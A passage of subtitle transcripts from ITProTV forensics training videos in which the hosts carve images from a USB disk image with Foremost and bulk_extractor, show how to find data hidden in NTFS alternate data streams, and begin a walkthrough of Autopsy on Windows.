cuz we got\nsome information in the audit.text.\n\n380\n00:19:17.500 --> 00:19:22.690\nSo cat audit, I'll do less cuz\nyou never know how big it is.\n\n381\n00:19:22.690 --> 00:19:24.288\nAnd kinda gives you a rundown.\n\n382\n00:19:24.288 --> 00:19:26.710\nForemost started, invocation type.\n\n383\n00:19:26.710 --> 00:19:30.610\nSo kinda giving you the rundown\nof what you did and what it did.\n\n384\n00:19:30.610 --> 00:19:33.510\nHere's its configuration file,\nand there's where it starts.\n\n385\n00:19:33.510 --> 00:19:36.200\nSo this is all forensically\ngood information.\n\n386\n00:19:36.200 --> 00:19:39.890\nSo if I needed to turn this in,\npart of my reports,\n\n387\n00:19:39.890 --> 00:19:43.870\nmaybe it's going into a legal action,\nthis would be good information, right?\n\n388\n00:19:45.120 --> 00:19:48.880\nSo we'll look through here, and you can\nsee, here are the files that we found.\n\n389\n00:19:48.880 --> 00:19:51.980\nSeven jpgs and two gifs.\n\n390\n00:19:51.980 --> 00:19:54.220\nSo there we go and END, very good.\n\n391\n00:19:54.220 --> 00:19:56.690\nSo now there's the base for\na report, I can turn that in.\n\n392\n00:19:56.690 --> 00:19:57.550\nI like that.\n\n393\n00:19:57.550 --> 00:19:58.498\nLet's look at those files.\n\n394\n00:19:58.498 --> 00:20:02.967\nI'm gonna bring up my file browser, and\n\n395\n00:20:02.967 --> 00:20:08.230\nlet's go in to RHINO1\ninto the Output folder.\n\n396\n00:20:08.230 --> 00:20:10.170\nLet's start with jpegs.\n\n397\n00:20:10.170 --> 00:20:12.833\nThere we go, we've got a few images here.\n\n398\n00:20:12.833 --> 00:20:14.865\nOne's an alligator.\n\n399\n00:20:14.865 --> 00:20:18.624\n[INAUDIBLE] another alligator,\n\n400\n00:20:18.624 --> 00:20:22.585\nnot illegal as far as I-\n&gt;&gt; Alligators are cute.\n\n401\n00:20:22.585 --> 00:20:25.093\n&gt;&gt; Alligators, they are our friends.\n\n402\n00:20:25.093 --> 00:20:25.824\nThere's another one.\n\n403\n00:20:25.824 --> 00:20:27.120\nApparently they like gators.\n\n404\n00:20:29.470 --> 00:20:31.130\nThere's a baby one, just hatched.\n\n405\n00:20:31.130 --> 00:20:32.150\nHe's brand new to the world.\n\n406\n00:20:34.390 --> 00:20:35.660\nOld up, swelled up.\n\n407\n00:20:35.660 --> 00:20:38.280\n&gt;&gt; No.\n&gt;&gt; What's that?\n\n408\n00:20:38.280 --> 00:20:39.670\n&gt;&gt; That looks horrible.\n\n409\n00:20:39.670 --> 00:20:41.640\n&gt;&gt; We found a rhinocerous picture.\n\n410\n00:20:41.640 --> 00:20:44.390\nIn, and of itself, not illegal quite yet.\n&gt;&gt; It's true.\n\n411\n00:20:44.390 --> 00:20:45.420\n&gt;&gt; Right, we've only found one,\n\n412\n00:20:45.420 --> 00:20:50.310\nbut this is an indication that\nnefarious ongoings are afoot, and\n\n413\n00:20:50.310 --> 00:20:51.990\nwe need to continue our search.\n\n414\n00:20:51.990 --> 00:20:54.075\nContinue our forensics investigation.\n\n415\n00:20:54.075 --> 00:20:58.140\n[COUGH] All right ,let's see here.\n\n416\n00:20:58.140 --> 00:20:58.850\nMore rhinos.\n\n417\n00:20:58.850 --> 00:21:02.560\nI wonder if this counts as two because\nthere's two rhinos in this picture.\n\n418\n00:21:02.560 --> 00:21:04.380\nThis could count-\n&gt;&gt; At least one and a half.\n\n419\n00:21:04.380 --> 00:21:05.420\n&gt;&gt; Yeah, yeah,\n\n420\n00:21:05.420 --> 00:21:07.830\nthe legal definition\nmight be obscure there.\n\n421\n00:21:07.830 --> 00:21:12.571\nWe'll leave it to legal to handle that,\nbut we found another photo of\n\n422\n00:21:12.571 --> 00:21:16.676\ntwo rhinoceroses, and\nthen a duplicate of the alligator.\n\n423\n00:21:16.676 --> 00:21:20.932\nLet's jump over into that gif business.\n\n424\n00:21:20.932 --> 00:21:25.490\nYeah, there we go, we got us another one\n&gt;&gt; Mm-hm\n\n425\n00:21:25.490 --> 00:21:29.189\n&gt;&gt; And one more, looks like, I'm guessing\n\n426\n00:21:29.189 --> 00:21:33.385\neven art of rhinoceroses count?\n&gt;&gt; Mm-hm.\n\n427\n00:21:33.385 --> 00:21:36.470\n&gt;&gt; So, again, we'll leave that to legal.\n\n428\n00:21:36.470 --> 00:21:37.550\nWe don't have that.\n\n429\n00:21:37.550 --> 00:21:40.990\nAll we're doing is finding rhino pictures\nand putting them in our case file.\n\n430\n00:21:40.990 --> 00:21:45.800\nSo I would now be able to collect this\nevidence, put it into our case, [COUGH]\n\n431\n00:21:45.800 --> 00:21:50.930\nand show that there was some goings\non when it comes to rhino pictures.\n\n432\n00:21:50.930 --> 00:21:54.400\nWe have found quite a few, so\nI think at this count, we have one,\n\n433\n00:21:54.400 --> 00:21:59.590\ntwo, [COUGH] excuse me,\nwe got three, four.\n\n434\n00:21:59.590 --> 00:22:01.620\nSo far, we've got four rhino pictures.\n\n435\n00:22:01.620 --> 00:22:02.640\n&gt;&gt; Right.\n&gt;&gt; Right?\n\n436\n00:22:02.640 --> 00:22:06.269\nAnd I'm not gonna walk us through the ten\npictures, cuz they're all the same.\n\n437\n00:22:06.269 --> 00:22:07.173\n&gt;&gt; [LAUGH]\n\n438\n00:22:07.173 --> 00:22:07.742\n&gt;&gt; I'll leave it to you.\n\n439\n00:22:07.742 --> 00:22:10.220\nI'm just gonna show you how\nwe can find the ten pictures.\n\n440\n00:22:10.220 --> 00:22:11.720\nBut you can finish up, right?\n\n441\n00:22:11.720 --> 00:22:12.850\nHere we go.\n\n442\n00:22:12.850 --> 00:22:17.479\nSo that worked pretty well, I like that.\n&gt;&gt; Yeah, and these are files that weren't\n\n443\n00:22:17.479 --> 00:22:21.757\nreadily visible using normal methods,\nright, until you started looking into that\n\n444\n00:22:21.757 --> 00:22:23.732\nslack space, if you will.\n&gt;&gt; Exactly,\n\n445\n00:22:23.732 --> 00:22:27.982\nyou wanna get into that slack space,\ndefine these images, carve them out, and\n\n446\n00:22:27.982 --> 00:22:30.338\nagain, you're just starting to look for.\n\n447\n00:22:30.338 --> 00:22:31.534\nThat's what these tools do.\n\n448\n00:22:31.534 --> 00:22:33.240\nThat's what they're at our ready for.\n\n449\n00:22:33.240 --> 00:22:36.645\nSo if you're in this enviroment,\nyou wanna be able to carve that data out.\n\n450\n00:22:36.645 --> 00:22:40.443\nYou can use formulas, and\nobviously did a very good job.\n\n451\n00:22:40.443 --> 00:22:44.842\nFunny, [COUGH] I also told you\nBulk Extractor will do it as well,\n\n452\n00:22:44.842 --> 00:22:46.005\nvery good tool.\n\n453\n00:22:46.005 --> 00:22:49.024\nIt did not find as many as Foremost did.\n\n454\n00:22:49.024 --> 00:22:52.123\nBut that being said,\nthat doesn't mean you don't use it.\n\n455\n00:22:52.123 --> 00:22:57.178\nIt's always good because maybe, what\nif I started with Bulk Extractor went,\n\n456\n00:22:57.178 --> 00:23:00.333\nhey, found those carved out files,\nI'm done.\n\n457\n00:23:00.333 --> 00:23:01.819\nWouldn't have been done, right?\n\n458\n00:23:01.819 --> 00:23:05.128\nBecause it wouldn't have found\nthe files that Foremost did.\n\n459\n00:23:05.128 --> 00:23:09.644\nSo always find a couple of tools that kind\nof are, I guess for lack of a better word,\n\n460\n00:23:09.644 --> 00:23:11.291\ncompetition for each other.\n\n461\n00:23:11.291 --> 00:23:15.788\nThings that do the same thing\nbecause it will e-verification.\n\n462\n00:23:15.788 --> 00:23:19.068\nNow imagine I ran Foremost,\nhere's my reports,\n\n463\n00:23:19.068 --> 00:23:24.550\nhere are the files I found using Foremost,\nthought of being there in the case file.\n\n464\n00:23:25.880 --> 00:23:28.725\nThey go, okay, well,\nhow great is Foremost?\n\n465\n00:23:28.725 --> 00:23:30.938\nWell, now I'm gotta defend Foremost.\n\n466\n00:23:30.938 --> 00:23:35.624\nBut if I did Bulk Extractor and Foremost,\nBulk Extractor was able to find this many,\n\n467\n00:23:35.624 --> 00:23:37.680\nForemost was able to find this many.\n\n468\n00:23:37.680 --> 00:23:40.791\nAnd together they verify\neach other's results, right?\n\n469\n00:23:40.791 --> 00:23:43.380\nIt's more weight on the evidence.\n\n470\n00:23:43.380 --> 00:23:45.168\nSo I like to do that kinda thing.\n\n471\n00:23:45.168 --> 00:23:49.000\nI like to use tools that are the same,\nsee if I get the same results.\n\n472\n00:23:49.000 --> 00:23:51.473\nYou never know, and nine times out of ten,\n\n473\n00:23:51.473 --> 00:23:54.163\nyou're probably gonna\nget the same results.\n\n474\n00:23:54.163 --> 00:23:57.675\nBut that tenth time could be\njust the linchpin you need,\n\n475\n00:23:57.675 --> 00:24:02.773\nthat piece of data you're looking for\nthat you overlooked previously, right?\n\n476\n00:24:02.773 --> 00:24:06.602\nSo I'll say to run bulk extractor here,\njust real quickly.\n\n477\n00:24:06.602 --> 00:24:07.280\nClear the screen.\n\n478\n00:24:07.280 --> 00:24:14.880\nYou just do bulk,\nbluck [LAUGH] bulk_extracor, like so.\n\n479\n00:24:14.880 --> 00:24:19.350\nAnd I will do -s, or\nthis is basically the typed version.\n\n480\n00:24:20.630 --> 00:24:25.773\nWe are going to do jpeg_carve_mode=2.\n\n481\n00:24:25.773 --> 00:24:30.294\nAnd you can go into like the main\nfile to help [INAUDIBLE].\n\n482\n00:24:30.294 --> 00:24:34.945\nSee basically, I'm choosing\na specific mode in which I want\n\n483\n00:24:34.945 --> 00:24:39.789\nbulk_extractor to run,\nlooking for jpegs, specifically.\n\n484\n00:24:41.070 --> 00:24:43.674\nAnd no, it did not find the gifs,\n\n485\n00:24:43.674 --> 00:24:48.703\nit didn't find one of the jpegs\nthat Foremost did find, right?\n\n486\n00:24:48.703 --> 00:24:51.659\nSo even though I'm running\nthis solely in jpeg mode,\n\n487\n00:24:51.659 --> 00:24:54.756\ndon't let that be a hindrance\nto you there, all right?\n\n488\n00:24:54.756 --> 00:24:59.468\nSo there we go, and\nthen we've gotta feed it the, what is it,\n\n489\n00:24:59.468 --> 00:25:02.982\njust RHINO2 is where we're at?\n\n490\n00:25:02.982 --> 00:25:07.889\nAnd it's /RHINO, [INAUDIBLE] so\n\n491\n00:25:07.889 --> 00:25:13.180\nit's root/RHINO2/OUSB.dd.\n\n492\n00:25:13.180 --> 00:25:18.491\nAnd then, I'll give it -o for\n\n493\n00:25:18.491 --> 00:25:24.014\noutput, /root/RHINO2/.\n\n494\n00:25:24.014 --> 00:25:30.352\nWe'll make a folder, call it BE_RHINO.\n\n495\n00:25:32.154 --> 00:25:33.560\nThere we go.\n\n496\n00:25:33.560 --> 00:25:36.563\nI think that's good.\n\n497\n00:25:36.563 --> 00:25:39.409\nOpen, there we go, it's doing its thing.\n\n498\n00:25:39.409 --> 00:25:40.970\nAnd time elapsed.\n\n499\n00:25:40.970 --> 00:25:44.010\nLooks like we're just about done,\nthere we go.\n\n500\n00:25:44.010 --> 00:25:49.200\nShould be able to back up and\nget a BE_RHINO folder.\n\n501\n00:25:49.200 --> 00:25:50.396\nThere it is.\n\n502\n00:25:50.396 --> 00:25:53.920\nLet's cd into [INAUDIBLE] RHINO.\n\n503\n00:25:53.920 --> 00:25:55.630\nDo an ls.\n\n504\n00:25:55.630 --> 00:25:59.232\nAnd now,\nI have a jpeg carved folders there.\n\n505\n00:25:59.232 --> 00:26:03.920\nAnd these are all just, I think it\nran the actual defaults as well.\n\n506\n00:26:05.170 --> 00:26:06.730\nSo, I guess that happens.\n\n507\n00:26:06.730 --> 00:26:12.408\nThe reports on what it ran when it ran,\nthat specific type or mode of distraction.\n\n508\n00:26:12.408 --> 00:26:17.293\nBut we're gonna run the jpeg carved CD\ninto jpeg carved ls cd [INAUDIBLE] 000.\n\n509\n00:26:17.293 --> 00:26:24.430\nAnd there we go, we've got six jpegs\nhere where we had seven with Foremost.\n\n510\n00:26:24.430 --> 00:26:25.290\nThere you go.\n\n511\n00:26:25.290 --> 00:26:29.810\nBut those are great ways for us to find\n\n512\n00:26:29.810 --> 00:26:34.160\ndifferent data that's been\nhidden throughout our systems.\n\n513\n00:26:34.160 --> 00:26:37.895\nNow, another way that data could\nbe hidden inside of a system,\n\n514\n00:26:37.895 --> 00:26:40.040\nmaybe you're working on\na Windows operating system.\n\n515\n00:26:40.040 --> 00:26:43.260\nThere's also something called\nalternate data streams.\n\n516\n00:26:43.260 --> 00:26:44.380\nVery important thing.\n\n517\n00:26:44.380 --> 00:26:46.210\nThis is one of Adam's\nfavorite demonstrations.\n\n518\n00:26:46.210 --> 00:26:46.940\n&gt;&gt; Yeah, it's a good one.\n\n519\n00:26:46.940 --> 00:26:49.450\n&gt;&gt; It's very cool, cuz most people, excuse\n\n520\n00:26:49.450 --> 00:26:53.738\nme, they don't realize this is a built-in\nfunction of the Windows Operating System.\n\n521\n00:26:53.738 --> 00:26:54.822\nLet's go over there really quickly.\n\n522\n00:26:54.822 --> 00:26:55.623\nI'll show you this super easy.\n\n523\n00:26:55.623 --> 00:27:01.473\nYou get logged in [COUGH] got a frog\nin my throat this morning, my man.\n\n524\n00:27:01.473 --> 00:27:05.430\nAll right, CMD,\nbring up this guy right here.\n\n525\n00:27:05.430 --> 00:27:07.694\nFirst off,\nlet's bring up the File Explorer,\n\n526\n00:27:07.694 --> 00:27:09.999\ntake just a few seconds to show you this.\n\n527\n00:27:09.999 --> 00:27:14.570\nLet me go to this PC, local disk C:.\n\n528\n00:27:14.570 --> 00:27:18.580\nForensics there we go,\nwe've got the Rhino USB,\n\n529\n00:27:18.580 --> 00:27:22.970\nwhich I've imported [INAUDIBLE] dd that\nI was testing things with, a case file.\n\n530\n00:27:22.970 --> 00:27:27.260\nBut I'm not seeing any new weirdness.\n\n531\n00:27:27.260 --> 00:27:29.240\nLet's go into Documents.\n\n532\n00:27:29.240 --> 00:27:32.430\nI do have a test.txt here,\na couple of folders.\n\n533\n00:27:32.430 --> 00:27:34.930\nBut this is the folder\nwe wanna take a look at.\n\n534\n00:27:34.930 --> 00:27:36.200\nNothing going on here.\n\n535\n00:27:36.200 --> 00:27:37.090\nI got this test.text.\n\n536\n00:27:37.090 --> 00:27:38.070\nLet's take a look at that.\n\n537\n00:27:38.070 --> 00:27:39.800\nThis is just a regular file,\n\n538\n00:27:39.800 --> 00:27:41.979\nthere is absolutely nothing\nhinky going on here, right?\n\n539\n00:27:41.979 --> 00:27:44.520\nRight?\n&gt;&gt; [LAUGH] Wink, wink, yeah.\n\n540\n00:27:44.520 --> 00:27:46.970\n&gt;&gt; Obviously that's a clue\n\n541\n00:27:46.970 --> 00:27:49.480\nto there is something going on here.\n\n542\n00:27:49.480 --> 00:27:50.300\nLet's take a look at that.\n\n543\n00:27:51.710 --> 00:27:55.520\nIf I come into here, I saw nothing in the\nFile Explorer other than the test.text,\n\n544\n00:27:55.520 --> 00:27:56.090\ncorrect?\n\n545\n00:27:56.090 --> 00:27:57.230\nWe're all on the same page?\n\n546\n00:27:57.230 --> 00:27:57.860\nExcellent.\n\n547\n00:27:57.860 --> 00:28:01.720\nDo a dir, let's go to Documents.\n\n548\n00:28:01.720 --> 00:28:04.700\nHello, I can't see my screen.\n\n549\n00:28:04.700 --> 00:28:07.630\nYou guys can't either,\ncuz it's down below, there we go.\n\n550\n00:28:07.630 --> 00:28:09.120\nLet's scroll down here.\n\n551\n00:28:09.120 --> 00:28:10.890\nSee Documents.\n\n552\n00:28:10.890 --> 00:28:11.920\nThere we go.\n\n553\n00:28:11.920 --> 00:28:13.820\nDo a dir again.\n\n554\n00:28:13.820 --> 00:28:17.094\nAnd there we go.\nWe've got test.txt, there's imager_lite,\n\n555\n00:28:17.094 --> 00:28:17.969\nStreamArmor.\n\n556\n00:28:17.969 --> 00:28:18.595\nBadabing.\n\n557\n00:28:18.595 --> 00:28:19.980\nCrazy.\nNothing, right?\n\n558\n00:28:19.980 --> 00:28:23.314\nWhat if we do this, dir [INAUDIBLE] r?\n\n559\n00:28:23.314 --> 00:28:26.278\nLook at this,\n\n560\n00:28:26.278 --> 00:28:31.620\nhidden.txt.\n&gt;&gt; What is that?\n\n561\n00:28:31.620 --> 00:28:32.300\n&gt;&gt; So what is that?\n\n562\n00:28:32.300 --> 00:28:34.340\nThis is alternate data string right?\n\n563\n00:28:34.340 --> 00:28:35.870\nSo when you create a file, a text file,\n\n564\n00:28:35.870 --> 00:28:41.060\ninside of a Microsoft system,\nspecifically with NTFS, I believe.\n\n565\n00:28:41.060 --> 00:28:43.770\nNot FATS, must be NTFS.\n\n566\n00:28:43.770 --> 00:28:50.220\nYou can basically put some data inside of\nthe slack space of the data that you have.\n\n567\n00:28:50.220 --> 00:28:51.330\nSo how do we do that?\n\n568\n00:28:51.330 --> 00:28:53.706\nWell, it's not that hard, actually.\n\n569\n00:28:53.706 --> 00:28:57.096\nAnd this is why Justin was\ngetting in trouble for\n\n570\n00:28:57.096 --> 00:28:59.750\nusing colons in his file names.\n&gt;&gt; [LAUGH]\n\n571\n00:28:59.750 --> 00:29:01.640\n&gt;&gt; Cuz it was doing crazy stuff.\n\n572\n00:29:01.640 --> 00:29:02.320\nAnd here's what you do.\n\n573\n00:29:02.320 --> 00:29:08.260\nYou can say, I want to create,\nI'm gonna say notepad.exe, right?\n\n574\n00:29:08.260 --> 00:29:11.885\nI wanna create a file,\nwe'll call it file1.txt.\n\n575\n00:29:11.885 --> 00:29:17.726\nBut I wanna hide some data in\nthe alternate data stream,\n\n576\n00:29:17.726 --> 00:29:22.959\nand we'll call that secretfile.txt,\nlike so.\n\n577\n00:29:22.959 --> 00:29:28.160\nThat colon allows me to hide data\ninside of this data stream, all right?\n\n578\n00:29:28.160 --> 00:29:29.280\nHit Return.\n\n579\n00:29:29.280 --> 00:29:34.750\nHere comes Notepad,\nthis secretfile.txt does not exist,\n\n580\n00:29:34.750 --> 00:29:36.020\ndo you wanna create a file?\n\n581\n00:29:36.020 --> 00:29:39.510\nYes, I do, since I'm the one\ndoing the hiding and fun stuff.\n\n582\n00:29:39.510 --> 00:29:46.500\nI can now, this is all secret stuff, hush.\n\n583\n00:29:48.849 --> 00:29:49.487\nRight?\n\n584\n00:29:49.487 --> 00:29:54.367\nIt's all good, I hit File and Save.\n\n585\n00:29:54.367 --> 00:29:56.620\nIt's all good.\n\n586\n00:29:56.620 --> 00:30:00.310\nHit that, badabing, I do a dir.\n\n587\n00:30:00.310 --> 00:30:04.608\nWe will see that I have test.txt and\nfile.1.\n\n588\n00:30:04.608 --> 00:30:09.177\nYes, I don't need virus protection, thank\nyou, please go away, stop doing that.\n\n589\n00:30:09.177 --> 00:30:10.970\n[LAUGH] Anyway, so there it is.\n\n590\n00:30:10.970 --> 00:30:11.518\nFile1.txt.\n\n591\n00:30:13.653 --> 00:30:16.570\nAnd there's no data in it\nbecause I haven't done anything.\n\n592\n00:30:16.570 --> 00:30:20.480\nSo now, I can just open Notepad,\nwrite stuff on there all day long.\n\n593\n00:30:20.480 --> 00:30:23.490\nBut I won't be able to see that.\n\n594\n00:30:23.490 --> 00:30:28.948\nWhat I need to do is know that it's there\nby using the slash R option with my dir,\n\n595\n00:30:28.948 --> 00:30:31.042\nknowing that file's there.\n\n596\n00:30:31.042 --> 00:30:35.130\nNow it allows me to\nactually open that file.\n\n597\n00:30:35.130 --> 00:30:38.622\nAnd I can say notepad.exe, and\n\n598\n00:30:38.622 --> 00:30:43.931\nsay file1.txt colon secret dot,\nwhat was it?\n\n599\n00:30:43.931 --> 00:30:44.995\nI forget.\n\n600\n00:30:44.995 --> 00:30:46.807\n[LAUGH] I forget what I named it.\n&gt;&gt; Secretfile.txt.\n\n601\n00:30:46.807 --> 00:30:47.589\n&gt;&gt; Was it?\n\n602\n00:30:47.589 --> 00:30:52.762\nAll right, notepad.exe with file1.txt\n\n603\n00:30:52.762 --> 00:30:58.654\ncolon secret file, yeah,\nyou're right .txt.\n\n604\n00:30:58.654 --> 00:30:59.802\nNotepad.txt.\n\n605\n00:30:59.802 --> 00:31:03.400\nYou're right, you are absolutely right.\n\n606\n00:31:03.400 --> 00:31:04.770\nIt's not a real program.\n\n607\n00:31:04.770 --> 00:31:07.270\nBut there you go, there's my secret stuff.\n\n608\n00:31:07.270 --> 00:31:10.648\nAll right, I can do the same thing\nwith my other files as well.\n\n609\n00:31:10.648 --> 00:31:14.671\nSo if I do that dir-r,\nI am going to [LAUGH] I'm so\n\n610\n00:31:14.671 --> 00:31:16.887\nused to Linux.\n&gt;&gt; [LAUGH]\n\n611\n00:31:16.887 --> 00:31:17.910\n&gt;&gt; /r, there we go.\n\n612\n00:31:17.910 --> 00:31:20.920\nNow I'm starting so\nif I need those filenames,\n\n613\n00:31:20.920 --> 00:31:25.250\nyou can see the data that's in there,\nit's 21 bytes of data, I believe.\n\n614\n00:31:25.250 --> 00:31:27.550\nAnd then, 21 is here as well.\n\n615\n00:31:27.550 --> 00:31:28.730\nI can look at these files.\n\n616\n00:31:28.730 --> 00:31:30.660\nSo you wanna look for\nthose alternate data streams.\n\n617\n00:31:30.660 --> 00:31:31.910\nPeople might be hiding stuff.\n\n618\n00:31:31.910 --> 00:31:36.610\nIf you've got the wherewithal, you know\nthis exists, even if you know it exists,\n\n619\n00:31:36.610 --> 00:31:37.940\nyou might not remember.\n\n620\n00:31:37.940 --> 00:31:40.610\nSo make it part of your\nworkflow as you're looking for\n\n621\n00:31:40.610 --> 00:31:42.840\ndata inside of your operating systems.\n\n622\n00:31:42.840 --> 00:31:46.595\nThat being said, Mike, I know we're out of\ntime for this episode, so we're gonna to\n\n623\n00:31:46.595 --> 00:31:50.080\nhave to move ourselves [INAUDIBLE]\n&gt;&gt; All right, sounds like a plan, Daniel.\n\n624\n00:31:50.080 --> 00:31:53.790\nGreat look, though, so far, as we work\nour way through this rhino exercise.\n\n625\n00:31:53.790 --> 00:31:54.950\nFound some images of rhinos.\n\n626\n00:31:54.950 --> 00:31:57.910\nMore importantly, learned how we\ncan look for data in places that\n\n627\n00:31:57.910 --> 00:32:02.260\nyou might not normally think to look, find\nwhere they are hiding that information.\n\n628\n00:32:02.260 --> 00:32:03.010\nWe appreciate that.\n\n629\n00:32:03.010 --> 00:32:05.530\nI hope everybody out there\nenjoyed watching this one.\n\n630\n00:32:05.530 --> 00:32:08.300\nSigning off for ITProTV,\nI've been your host, Mike Rodrick.\n\n631\n00:32:08.300 --> 00:32:09.010\n&gt;&gt; I'm Daniel Lowrie.\n\n632\n00:32:09.010 --> 00:32:09.813\n&gt;&gt; And we'll see you next time.\n\n633\n00:32:13.739 --> 00:32:16.923\n[MUSIC]\n\n634\n00:32:16.923 --> 00:32:19.205\n&gt;&gt; Thank you for watching ITProTV.\n\n",

[CROSSTALK]\n\n3\n00:00:03.155 --> 00:00:07.313\n[MUSIC]\n\n4\n00:00:07.313 --> 00:00:10.888\n&gt;&gt; You're watching ITProTV.\n\n5\n00:00:12.500 --> 00:00:15.047\n&gt;&gt; Hello, welcome to another\nexciting episode here at ITProTV.\n\n6\n00:00:15.047 --> 00:00:20.090\nI'm your host Mike Rodrick,\ntoday we're doing our CYSA Plus.\n\n7\n00:00:20.090 --> 00:00:22.910\n&gt;&gt; In this episode we're actually\ncontinuing our thought process\n\n8\n00:00:22.910 --> 00:00:24.630\non forensic suites and utilities.\n\n9\n00:00:24.630 --> 00:00:25.850\nThis is a part three, so\n\n10\n00:00:25.850 --> 00:00:28.880\nif you missed one of the first two parts\nmake sure you go back and check those out.\n\n11\n00:00:28.880 --> 00:00:31.650\nBack in the studio with us again is\nnone other than Mr. Daniel Lowrie.\n\n12\n00:00:31.650 --> 00:00:32.350\nWelcome back, Daniel.\n\n13\n00:00:32.350 --> 00:00:34.621\n&gt;&gt; Hey, Mike.\nGlad to be back on this little journey of\n\n14\n00:00:34.621 --> 00:00:36.900\nforensics awesomeness that we've been on.\n\n15\n00:00:36.900 --> 00:00:38.730\nHopefully that's what you feel it is.\n\n16\n00:00:38.730 --> 00:00:39.833\n&gt;&gt; [LAUGH]\n&gt;&gt; We've been having a lot of fun\n\n17\n00:00:39.833 --> 00:00:40.810\nlearning about new tools.\n\n18\n00:00:40.810 --> 00:00:44.496\nPrevious episode we looked at data\ncarving, file carving, should I say.\n\n19\n00:00:44.496 --> 00:00:48.914\nFinding that hidden data inside\nof the slack space of other data.\n\n20\n00:00:48.914 --> 00:00:50.480\nSo very cool stuff.\n\n21\n00:00:50.480 --> 00:00:53.170\nWe looked at foremost and bulk extractor.\n\n22\n00:00:53.170 --> 00:00:53.942\nWe jumped over and\n\n23\n00:00:53.942 --> 00:00:57.560\nlooked at alternate data streams inside\nof the Windows NTFS file system.\n\n24\n00:00:57.560 --> 00:01:01.287\nAnd now, while we're in Windows, I thought\nit was a good idea to show you Autopsy.\n\n25\n00:01:01.287 --> 00:01:04.628\nRemember we were using the Sleuth Kit\nover there in Kali Linux.\n\n26\n00:01:04.628 --> 00:01:09.775\nBut if you're in Windows, and again,\nput some things side-by-side,\n\n27\n00:01:09.775 --> 00:01:12.940\ncompare them and\ncontrast them, as it were.\n\n28\n00:01:12.940 --> 00:01:17.395\nWe're going to take a look at Autopsy\nin a Windows system so that we can hey,\n\n29\n00:01:17.395 --> 00:01:22.380\nmaybe Windows is my flavor of choice, and\nI wanted to be able to do this stuff, too.\n\n30\n00:01:22.380 --> 00:01:24.420\nSo I didn't want to leave you\nguys in the dark on that.\n\n31\n00:01:24.420 --> 00:01:28.740\nSo let's jump into the computer, and\nlet's fire up Autopsy here in Windows.\n\n32\n00:01:28.740 --> 00:01:34.834\nYou'll notice that the, I like how\nin Windows the icon is a Doberman,\n\n33\n00:01:34.834 --> 00:01:38.270\nbut in Linux it's a Bloodhound.\n\n34\n00:01:38.270 --> 00:01:39.710\n&gt;&gt; Really?\n&gt;&gt; So interesting.\n\n35\n00:01:39.710 --> 00:01:44.370\nAnd it does seem to me that\nthe Windows version of Autopsy\n\n36\n00:01:44.370 --> 00:01:46.230\nis a bit more aggressive,\nto be honest with you.\n\n37\n00:01:46.230 --> 00:01:48.220\nAnd you'll see what I'm\ntalking about here.\n\n38\n00:01:49.320 --> 00:01:49.970\nLet's fire this up.\n\n39\n00:01:49.970 --> 00:01:50.870\nHere we go.\n\n40\n00:01:50.870 --> 00:01:54.000\nAutopsy is going,\ngiving us a beautiful graphical interface\n\n41\n00:01:54.000 --> 00:01:56.810\njust like we're used to inside of\nour Windows operating systems.\n\n42\n00:01:56.810 --> 00:01:58.280\nTypically, anyway.\n\n43\n00:01:58.280 --> 00:02:01.880\nAnd I'm just giving it a minute,\nit's loading up some modules which you can\n\n44\n00:02:01.880 --> 00:02:06.540\ndownload and get any third-party modules\nif they have available from their sites.\n\n45\n00:02:06.540 --> 00:02:11.150\nAnd here, we're gonna start a new case,\nvery easy-peasy stuff, right?\n\n46\n00:02:11.150 --> 00:02:12.320\nYou point, you click.\n\n47\n00:02:12.320 --> 00:02:16.590\nI want New Case,\ngonna give it some case information.\n\n48\n00:02:16.590 --> 00:02:17.690\nWhat's the case name?\n\n49\n00:02:17.690 --> 00:02:22.839\nWe'll call it rhino hunt.\n\n50\n00:02:22.839 --> 00:02:27.200\nNext, I'll put it in my base\ndirectory which I have created.\n\n51\n00:02:27.200 --> 00:02:32.700\nI just created a folder called forensics,\nand it will be rhino hunt under forensics.\n\n52\n00:02:32.700 --> 00:02:33.510\nThere we go.\n\n53\n00:02:33.510 --> 00:02:35.440\nThis case type will be single user.\n\n54\n00:02:35.440 --> 00:02:38.760\nDon't have multi-user capabilities for\nwhatever reason.\n\n55\n00:02:38.760 --> 00:02:39.710\nBut there you go.\n\n56\n00:02:39.710 --> 00:02:43.120\nSo case data will be stored in the\nfollowing directory, and we click, Next.\n\n57\n00:02:44.310 --> 00:02:47.780\nIf I have a case number,\nI would put that here.\n\n58\n00:02:47.780 --> 00:02:50.310\nIf I don't,\nif I'm at the creation completely,\n\n59\n00:02:50.310 --> 00:02:53.040\nwe haven't even given it a case number,\nI can just make one up.\n\n60\n00:02:53.040 --> 00:02:57.920\nSo if I wanted to,\nI could say this is case 09546.\n\n61\n00:02:57.920 --> 00:02:59.060\nGreat, sounds good.\n\n62\n00:02:59.060 --> 00:03:03.090\nThere's my examiner information, my name,\nmy phone number, my e-mail address.\n\n63\n00:03:03.090 --> 00:03:04.520\nAny notes about me as an examiner,\n\n64\n00:03:04.520 --> 00:03:07.510\nmaybe my credentials or\nsomething like that could be in there.\n\n65\n00:03:07.510 --> 00:03:10.080\nAnd if we had an organization,\nwe could do that.\n\n66\n00:03:10.080 --> 00:03:11.870\nGo down here and click Finish.\n\n67\n00:03:13.050 --> 00:03:14.990\nAnd now, it's creating the database.\n\n68\n00:03:14.990 --> 00:03:16.955\nI wanna pull out just a little bit here,\n\n69\n00:03:16.955 --> 00:03:20.546\njust in case it gives us a box that's\ntoo big for how far I've zoomed in.\n\n70\n00:03:20.546 --> 00:03:24.909\nAnd I think we're, yeah, we're getting\nto the meat and potatoes of Autopsy.\n\n71\n00:03:26.929 --> 00:03:28.420\nHere we go.\n\n72\n00:03:28.420 --> 00:03:32.520\nNow, we need to add our data source,\nand this is very similar to what we saw\n\n73\n00:03:32.520 --> 00:03:35.830\nas we used the Sleuth Kit,\nthe Linux version of Autopsy.\n\n74\n00:03:35.830 --> 00:03:39.270\nSo it's asking me what do\nI want to add in here?\n\n75\n00:03:39.270 --> 00:03:42.440\nSo I'm going to say a disk image or\nVM file.\n\n76\n00:03:42.440 --> 00:03:47.429\nThat's a cool thing, you can add\nsnapshots from virtualization software.\n\n77\n00:03:47.429 --> 00:03:51.272\n&gt;&gt; Wow.\n&gt;&gt; From all the majors, right?\n\n78\n00:03:51.272 --> 00:03:55.790\nSo Hyper-V, VMware and\nwhat's the other one?\n\n79\n00:03:55.790 --> 00:03:57.334\nCitrix, is it?\n\n80\n00:03:57.334 --> 